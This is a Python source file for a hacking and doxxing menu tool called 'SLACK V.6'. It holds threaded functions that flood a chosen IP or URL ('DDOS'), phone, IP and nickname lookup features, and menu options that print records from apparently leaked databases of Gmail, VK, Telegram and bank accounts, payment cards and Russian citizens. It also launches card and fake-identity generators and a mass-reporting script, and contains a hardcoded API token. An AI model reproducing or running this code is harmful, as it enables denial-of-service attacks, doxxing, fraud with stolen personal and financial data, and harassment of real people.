import requests
import threading
import time
import random
import string
import json
import os
import sys
import subprocess
import socket
import uuid
import threading
from ipwhois import IPWhois
from geopy.geocoders import Nominatim
from pystyle import Colorate, Colors
from bs4 import BeautifulSoup

def open_StreetGen():
    file_path = "StreetGen.py"  # Replace with the actual path to your BLOODGRAM.py file
    subprocess.run(["python", file_path])  # Use `python` command to execute the file

def open_bloodgram():
    file_path = "BLOODGRAM.py"  # Replace with the actual path to your BLOODGRAM.py file
    subprocess.run(["python", file_path])  # Use `python` command to execute the file

def open_USACardgen():
    file_path = "USACard.py"  # Replace with the actual path to your BLOODGRAM.py file
    subprocess.run(["python", file_path])  # Use `python` command to execute the file

def open_fakeperson():
    file_path = "fakeperson.py"  # Replace with the actual path to your BLOODGRAM.py file
    subprocess.run(["python", file_path])  # Use `python` command to execute the file

def open_PortScanner():
    file_path = "PortScanner.py"  # Replace with the actual path to your BLOODGRAM.py file
    subprocess.run(["python", file_path])  # Use `python` command to execute the file

def search_phone(phone_number):
    url = f"http://num.voxlink.ru/get/?num={phone_number}"
    response = requests.get(url)
    data = response.json()
    return data

def search_ip(ip):
    url = f"http://ipwho.is/{ip}"
    response = requests.get(url)
    data = response.json()
    return data

def osint_search_nickname(nickname):
    social_media_platforms = ['vk']
    domens = ['com']
    sobachka = ['']

    for platform, domen, sobachka in zip(social_media_platforms, domens, sobachka):
        url = f"https://{platform}.{domen}/{sobachka}{nickname}"
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(f"{Colors.green}Valid: {url}{Colors.reset}")
            else:
                print(f"{Colors.white}Invalid: {url}{Colors.reset}")
        except requests.exceptions.RequestException as e:
            print(f"{Colors.white}Error: {e}{Colors.reset}")

def search_url(url):
    uri = "https://whoisjson.com/api/v1/whois"
    querystring = {"domain":url}
    headers = {
        "Authorization": "Token=dbbc251dda62fb51321132d79b070d00cad48acec4c660f7f0b313eb09056e9b"
    }
    response = requests.request("GET", uri, headers=headers, params=querystring)
    print(response.text)

def osint_search_google(nickname):
    social_networks = ["Telegram", "YouTube", "TikTok", "Instagram", "X", "Facebook", "Pinterest", "Snapchat", "LinkedIn"]
    results = {}

    for network in social_networks:
        url = f"https://www.google.com/search?q={nickname}+{network}"
        response = requests.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        links = soup.find_all("a")

        valid_links = []
        for link in links:
            href = link.get("href")
            if href and "google.com" not in href:
                valid_links.append(href)

        results[network] = valid_links

    print("OSINT Search Results:")
    for network, links in results.items():
        print(f"{network}:")
        for link in links:
            if "youtube.com" in link or "tiktok.com" in link or "instagram.com" in link or "facebook.com" in link or "pinterest.com" in link or "snapchat.com" in link or "linkedin.com" in link or "telegram.me" in link:
                print(f"{Colors.green}Valid: {link}{Colors.reset}")
            else:
                print(f"{Colors.white}Invalid: {link}{Colors.reset}")
        print()

def ddos_ip(ip, number_of_threads, duration):
    def attack():
        while True:
            try:
                response = requests.get(f"http://{ip}")
                print(f"Request sent to {ip}. Response status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
            time.sleep(1)

    threads = []
    for _ in range(number_of_threads):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

    time.sleep(duration)

    for t in threads:
        t.join()

def ddos_attack(url, number_of_threads, duration):
    def attack():
        while True:
            try:
                response = requests.get(url)
                print(f"Request sent to {url}. Response status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error: {e}")
            time.sleep(1)

    threads = []
    for _ in range(number_of_threads):
        t = threading.Thread(target=attack)
        threads.append(t)
        t.start()

    time.sleep(duration)

    for t in threads:
        t.join()

def generate_proxies(num_proxies):
    prefixes = ["192.168.", "10.0.", "172.16."]
    ports = [80, 8080, 3128, 8000]
    protocols = ["http", "socks4", "socks5"]

    protocol_choice = input(Colorate.Horizontal(Colors.white_to_green, "Enter the protocol (http, socks4, socks5): ")).lower()
    if protocol_choice not in protocols:
        print("Invalid protocol. Please try again.")
        return

    proxies = []
    for _ in range(num_proxies):
        prefix = random.choice(prefixes)
        ip = f"{prefix}{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        port = random.choice(ports)
        proxy_str = f"{protocol_choice}://{ip}:{port}"
        proxies.append(proxy_str)

    for proxy in proxies:
        print(proxy)

def search_russian_phone_numbers(prefix, length, num_results=10, random_order=False):
    numbers = []
    start = 10 ** (length - 1)
    end = 10 ** length
    if random_order:
        numbers = random.sample(range(start, end), num_results)
    else:
        numbers = range(start, end)

    valid_numbers = []
    for i in numbers:
        phone_number = f"+7{prefix}{i}"
        result = search_phone(phone_number)
        if result['operator'] != "Не определено":
            print(f"Valid phone number: {phone_number}")
            print(f"What`s App: https://wa.me/{phone_number}")
            print(f"Telegram: https://t.me/{phone_number}")            
            valid_numbers.append(phone_number)
        if len(valid_numbers) >= num_results:
            break

    return valid_numbers
    
def temp_mail():
    # Generate a temporary email address using the 1secmail API
    mail = requests.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1").json()[0]
    print(f"Your temporary email address is: {mail}")

    # Extract the login and domain parts from the email address
    login, domain = mail.split('@')

    # Wait for new messages and print them
    while True:
        response = requests.get(f"https://www.1secmail.com/api/v1/?action=getMessages&login={login}&domain={domain}")
        messages = response.json()
        if messages:
            for message in messages:
                if '1secmail.com' not in message['from']:
                    print(f"From: {message['from']}")
                    print(f"Subject: {message["subject"]}")
                    message_id = message['id']
                    message_body = requests.get(f"https://www.1secmail.com/api/v1/?action=readMessage&login={login}&domain={domain}&id={message_id}").json()['body']
                    print(f"Message Body:\n{message_body}")
        time.sleep(1)  

def theme():
    print("Available color options:")
    print("1. Red")
    print("2. Blue")

    choice = input("Enter the number corresponding to your color choice: ")

    if choice == "1":
        file_path = "mainred.py"  # Replace with the actual path to your mainred.py file
        subprocess.run(["python", file_path])  # Use `python` command to execute the file
    elif choice == "2":
        file_path = "main.py"  # Replace with the actual path to your maingreen.py file
        subprocess.run(["python", file_path])  # Use `python` command to execute the file
    else:
        print("Invalid choice. Please try again.")

def webcamersusa_db():
    filename = "WebCamersUSA.txt"
    num_lines = int(input("Enter the number of Webcamers: "))
    with open(filename, 'r') as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def Tinkoff_db():
    filename = "TinkoffDB.txt"
    num_lines = int(input("Enter the number of Tinkoff accounts: "))
    with open(filename, 'r',encoding="utf-8") as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def RusianPeoples_db():
    filename = "RussianPeoplesDB.txt"
    num_lines = int(input("Enter the number of peoples: "))
    with open(filename, 'r') as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def gmail_db():
    filename = "GmailDB.txt"
    num_lines = int(input("Enter the number of Gmail accounts: "))
    with open(filename, 'r') as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def vk_db():
    filename = "VKDB.txt"
    num_lines = int(input("Enter the number of VK accounts: "))
    with open(filename, 'r',encoding="utf-8") as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def SUPERBASE_db():
    filename = "100mlnDB.csv"
    num_lines = int(input("Enter the number of Peoples: "))
    with open(filename, 'r',encoding="utf-8") as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def tg_db():
    filename = "TGDB.csv"
    num_lines = int(input("Enter the number of TG Accounts: "))
    with open(filename, 'r',encoding="utf-8") as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def PeoplesRussia2_db():
    filename = "PeoplesRussia2DB.csv"
    num_lines = int(input("Enter the number of peoples Accounts: "))
    with open(filename, 'r',encoding="utf-8") as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def webcamers_db():
    filename = "WebCamersDB.txt"
    num_lines = int(input("Enter the number of WebCamers: "))
    with open(filename, 'r') as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def bitcoin_db():
    filename = "BitcoinDB.txt"
    num_lines = int(input("Enter the number of Bitcoin addresses: "))
    with open(filename, 'r') as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def cards_db():
    filename = "CardsDB.txt"
    num_lines = int(input("Enter the number of Cards: "))
    with open(filename, 'r') as file:
        lines = file.readlines()[:num_lines]
        for line in lines:
            print(line.strip())

def main():
    print(Colorate.Horizontal(Colors.white_to_green, '''
                                    
                                        ██████  ██▓    ▄▄▄       ▄████▄   ██ ▄█▀ 
                                      ▒██    ▒ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒  
                                      ░ ▓██▄   ▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░  
                                        ▒   ██▒▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄  
                                      ▒██████▒▒░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄ 
                                      ▒ ▒▓▒ ▒ ░░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ 
                                      ░ ░▒  ░ ░░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ 
                                      ░  ░  ░    ░ ░    ░   ▒   ░        ░ ░░ ░  
                                      ░      ░  ░     ░  ░░ ░      ░  ░          
                                 ----------------------------------------------------
                                                     SLACK V.6                         
                                                 By: @TermuXSoftware
                                 ----------------------------------------------------'''))      
                                 
    while True:
        print(Colorate.Horizontal(Colors.white_to_green, '''
                            ------------------------------------------------------------------          
                            [1] Phone Search    [11] USA Web Camers          [21] TG DB                
                            [2] Generate Num    [12] Telegram Bots           [22] Port Scanner  
                            [3] Temp Mail       [13] OSINT Google Search     [23] Russian DB 2  
                            [4] IP Search       [14] VK Checker              [24] Fake Person      
                            [5] DDOS IP         [15] Proxy Generator         [25] USA Card gen         
                            [6] DDOS URL        [16] VK DB                   [26] Street Gen 
                            [7] Gmails DB       [17] Russian DB              [27] Penis           
                            [8] Cards DB        [18] BLOODGRAM Snoser        [28] Theme            
                            [9] Bitcoins DB     [19] Tinkoff DB              [29] Info          
                            [10] RU Web Camers  [20] 100kkk Russian Peoples  [30] Exit                
                            ------------------------------------------------------------------               

'''))
        choice = input(Colorate.Horizontal(Colors.white_to_green, '''
                                                    @User/SLACK/main.py> $'''))
        print()
        if choice == "1":
            phone_number = input(Colorate.Horizontal(Colors.white_to_green, "Enter a phone number (+79999999999): "))
            if phone_number == "" or phone_number == " " or phone_number == "7":
                print("Phone number is empty")
            else:
                result = search_phone(phone_number)
                print(f"Number: {phone_number}")
                print(f"Operator: {result['operator']}")
                print(f"Region: {result['region']}")
                print(f"What`s App: https://wa.me/{phone_number}")
                print(f"Telegram: https://t.me/{phone_number}")
        elif choice == "3":
            temp_mail()
        elif choice == "28":
            theme()
        elif choice == "4":
            ip = input(Colorate.Horizontal(Colors.white_to_green, "Enter an IP address: "))
            if ip == "" or ip == " " or ip == "7":
                print("IP is empty")
            else:
                result = search_ip(ip)
                print(f"IP: {result['ip']}")
                print(f"Continent: {result['continent']}")
                print(f"Country: {result['country']}")
                print(f"Region: {result['region']}")
                print(f"City: {result['city']}")
                print(f"Timezone: {result['timezone']}")
                print(f"Latitude: {result['latitude']}")
                print(f"Longitude: {result['longitude']}")
        elif choice == "12":
                print('''1.https://t.me/PivoScanBot
2.https://t.me/Djftvt_bot
3.https://t.me/FreeOsintRobot
4.https://t.me/freeosintds_bot
5.https://t.me/Freeosinthelp_bot
6.https://t.me/FreeOSINTBOT_bot 
7.https://t.me/greenan_search_bot
8.https://t.me/gta_searchers_bot
9.https://t.me/funstat_kbot
10.https://t.me/usinfobot''')
        elif choice == "6":
            url = input(Colorate.Horizontal(Colors.white_to_green, "Enter the URL to attack: "))
            if url == "" or url == " " or url == "6":
                print("URL is empty")
            else:
                number_of_threads = int(input(Colorate.Horizontal(Colors.white_to_green, "Enter the number of threads: ")))
                duration = int(input(Colorate.Horizontal(Colors.white_to_green, "Enter the duration of the attack (in seconds): ")))
                ddos_attack(url, number_of_threads, duration)
        elif choice == "5":
            ip = input(Colorate.Horizontal(Colors.white_to_green, "Enter the IP address to attack: "))
            if ip == "" or ip == " " or ip == "6":
                print("IP is empty")
            else:
                number_of_threads = int(input(Colorate.Horizontal(Colors.white_to_green, "Enter the number of threads: ")))
                duration = int(input(Colorate.Horizontal(Colors.white_to_green, "Enter the duration of the attack (in seconds): ")))
                ddos_ip(ip, number_of_threads, duration)
        elif choice == "7":
                gmail_db()       
        elif choice == "9":
                bitcoin_db()
        elif choice == "10":
                webcamers_db()
        elif choice == "11":
                webcamersusa_db()
        elif choice == "16":
                vk_db()
        elif choice == "17":
                RusianPeoples_db()
        elif choice == "8":
                cards_db()
        elif choice == "19":
                Tinkoff_db()
        elif choice == "20":
                SUPERBASE_db()
        elif choice == "23":
                PeoplesRussia2_db()
        elif choice == "24":
                open_fakeperson
        elif choice == "25":
                open_USACardgen()
        elif choice == "27":
            print('''⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡾⠿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⣿⣦⣤⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣣⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣩⣾⡿⢃⣼⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⠿⢟⣩⣴⣿⡿⢋⣴⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢴⣶⣾⣿⠿⢛⣡⣶⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠩⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣍⡛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⠂⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⡿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠻⠛⠛⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀''')
        elif choice == "21":
                tg_db() 
        elif choice == "13":
                nickname = input(Colorate.Horizontal(Colors.white_to_green, "Enter a nickname to search: "))
                osint_search_google(nickname)
        elif choice == "14":
                nickname = input(Colorate.Horizontal(Colors.white_to_green, "Enter a nickname to search: "))
                osint_search_nickname(nickname)
        elif choice == "2":
            prefix = input(Colorate.Horizontal(Colors.white_to_green, "Enter the prefix of the phone number (e.g., 999): "))
            if prefix == "" or prefix == " " or prefix == "6":
                print("Prefix is empty")
            else:
                length = int(input(Colorate.Horizontal(Colors.white_to_green, "Enter the length of the phone number (e.g., 7): ")))
                num_results = int(input(Colorate.Horizontal(Colors.white_to_green, "Enter the number of results to return (default: 10): ")))
                random_order = input(Colorate.Horizontal(Colors.white_to_green, "Search in random order? (y/n, default: n): ")).lower() == 'y'
                valid_numbers = search_russian_phone_numbers(prefix, length, num_results, random_order)
                print(f"\nFound {len(valid_numbers)} valid phone numbers:")
                for number in valid_numbers:
                    print(number)
        elif choice == "75253235235235":
            print("No threads to exit.")
        elif choice == "18":
            open_bloodgram()
        elif choice == "22":
            open_PortScanner()
        elif choice == "15":
            num_proxies = int(input(Colorate.Horizontal(Colors.white_to_green, "Enter the number of proxies to generate: ")))
            generate_proxies(num_proxies)
        elif choice == "26":
            open_StreetGen()
        elif choice == "29":
            print("Info: SLACK, Version 6.0, Author: @TermuXSoftwares.")
        elif choice == "30":
            print("Exiting...")
            exit(1)
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting...")
        exit(1)